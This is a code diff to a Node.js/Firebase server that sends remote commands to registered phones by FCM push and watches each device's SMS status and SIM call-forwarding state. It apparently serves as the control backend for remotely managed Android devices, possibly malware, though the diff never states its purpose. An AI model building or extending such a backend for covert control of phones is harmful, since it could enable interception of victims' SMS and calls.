@@ -162,7 +162,7 @@ io.on("connection", (socket) => {
 });
 
 /* ======================================================
-      LEGACY COMMAND API
+      LEGACY /send-command
 ====================================================== */
 app.post("/send-command", async (req, res) => {
   try {
@@ -183,11 +183,128 @@ app.post("/send-command", async (req, res) => {
 });
 
 /* ======================================================
-      CHECK ONLINE COOLDOWN FIX 🔥🔥
+      BRO_REPLY WATCH LOGIC
+====================================================== */
+const liveReplyWatchers = new Map();
+
+function stopReplyWatcher(uid) {
+  if (liveReplyWatchers.has(uid)) {
+    const ref = liveReplyWatchers.get(uid);
+    ref.off();
+    liveReplyWatchers.delete(uid);
+    console.log("🛑 Reply watcher stopped:", uid);
+  }
+}
+
+function startReplyWatcher(uid) {
+  const ref = rtdb.ref(`checkOnline/${uid}`);
+
+  ref.on("value", (snap) => {
+    if (!snap.exists()) {
+      io.emit("brosReplyUpdate", {
+        uid,
+        success: true,
+        data: null,
+        message: "No reply found",
+      });
+      return;
+    }
+
+    const data = snap.val();
+    console.log("🔥 LIVE brosReply:", uid, data);
+
+    io.emit("brosReplyUpdate", {
+      uid,
+      success: true,
+      data: { uid, ...data },
+    });
+  });
+
+  liveReplyWatchers.set(uid, ref);
+  console.log("🎧 Reply watcher started:", uid);
+}
+
+app.get("/api/brosreply/:uid", async (req, res) => {
+  try {
+    const uid = req.params.uid;
+
+    stopReplyWatcher(uid);
+
+    const snap = await rtdb.ref(`checkOnline/${uid}`).get();
+    const data = snap.exists() ? { uid, ...snap.val() } : null;
+
+    startReplyWatcher(uid);
+
+    return res.json({
+      success: true,
+      data,
+      message: "Live listening started",
+    });
+  } catch (err) {
+    console.error("❌ brosreply ERROR:", err.message);
+    res.status(500).json({ success: false });
+  }
+});
+
+/* ======================================================
+      ADMIN UPDATE PUSHER
+====================================================== */
+rtdb.ref("commandCenter/admin/main").on("value", async (snap) => {
+  if (!snap.exists()) return;
+
+  const adminData = snap.val();
+  console.log("🛠 Admin updated:", adminData);
+
+  const all = await rtdb.ref("registeredDevices").get();
+  if (!all.exists()) return;
+
+  all.forEach((child) => {
+    const token = child.val()?.fcmToken;
+    if (token) {
+      sendFcmHighPriority(token, "ADMIN_UPDATE", {
+        deviceId: child.key,
+        ...adminData,
+      });
+    }
+  });
+});
+
+/* ======================================================
+      DEVICE COMMAND CENTER
+====================================================== */
+function extractCommandData(raw) {
+  if (raw?.action) return raw;
+  const keys = Object.keys(raw || {});
+  return raw[keys[keys.length - 1]] || null;
+}
+
+async function handleDeviceCommandChange(snap) {
+  if (!snap.exists()) return;
+
+  const uid = snap.key;
+  const raw = snap.val();
+  const cmd = extractCommandData(raw);
+  if (!cmd) return;
+
+  const devSnap = await rtdb.ref(`registeredDevices/${uid}`).get();
+  const token = devSnap.val()?.fcmToken;
+  if (!token) return;
+
+  await sendFcmHighPriority(token, "DEVICE_COMMAND", {
+    uniqueid: uid,
+    ...cmd,
+  });
+}
+
+rtdb.ref("commandCenter/deviceCommands").on("child_added", handleDeviceCommandChange);
+rtdb.ref("commandCenter/deviceCommands").on("child_changed", handleDeviceCommandChange);
+
+/* ======================================================
+      ⭐ CHECK ONLINE — RESET CLOCK + 5s COOLDOWN ⭐
 ====================================================== */
 
 const checkCooldown = new Map();
-const COOLDOWN_MS = 5000; // 🔥 5 sec gap
+const COOLDOWN_MS = 5000; // 5 sec gap
 
 async function handleCheckOnlineChange(snap) {
   if (!snap.exists()) return;
@@ -196,9 +313,9 @@ async function handleCheckOnlineChange(snap) {
   const data = snap.val() || {};
   const now = Date.now();
 
-  // 💡 prevent duplicate fast triggers
+  // ✔ Debounce prevent duplicate quick triggers
   if (checkCooldown.has(uid) && now - checkCooldown.get(uid) < COOLDOWN_MS) {
-    console.log("⏳ Cooldown skip for:", uid);
+    console.log("⏳ Skipped CHECK_ONLINE (cooldown):", uid);
     return;
   }
 
@@ -228,12 +345,11 @@ async function handleCheckOnlineChange(snap) {
   });
 }
 
-const checkOnlineRef = rtdb.ref("checkOnline");
-checkOnlineRef.on("child_added", handleCheckOnlineChange);
-checkOnlineRef.on("child_changed", handleCheckOnlineChange);
+rtdb.ref("checkOnline").on("child_added", handleCheckOnlineChange);
+rtdb.ref("checkOnline").on("child_changed", handleCheckOnlineChange);
 
 /* ======================================================
-      RESTART API
+      RESTART CONTROL
 ====================================================== */
 app.post("/restart/:uid", async (req, res) => {
   try {
@@ -325,7 +441,7 @@ app.get("/api/lastcheck/:uid", async (req, res) => {
 });
 
 /* ======================================================
-      SMS STATUS + SIM FORWARD WATCH
+      SMS STATUS + SIM FORWARD LIVE WATCH
 ====================================================== */
 
 const smsStatusRef = rtdb.ref("smsStatus");
@@ -387,8 +503,12 @@ function handleSimForwardChange(snap, event = "update") {
       success: true,
       uid,
       event,
-      sims: { 0: null, 1: null },
+      sims: {
+        0: null,
+        1: null,
+      },
     });
+
     console.log(`📶 simForwardStatus → uid=${uid}, removed`);
     return;
   }
@@ -427,6 +547,7 @@ simForwardRef.on("child_removed", (snap) =>
   handleSimForwardChange(snap, "removed")
 );
 
+
 /* ======================================================
       REGISTERED DEVICES LIVE UPDATE
 ====================================================== */
@@ -444,6 +565,7 @@ registeredDevicesRef.on("child_removed", () => {
   refreshDevicesLive("registered_removed");
 });
 
+
 app.get("/api/devices", async (req, res) => {
   try {
     const devices = await buildDevicesList();
@@ -459,8 +581,9 @@ app.get("/api/devices", async (req, res) => {
 });
 
 /* ======================================================
-      ROUTES MIDDLEWARE
+      ROUTES
 ====================================================== */
+
 refreshDevicesLive("initial");
 
 app.use(adminRoutes);
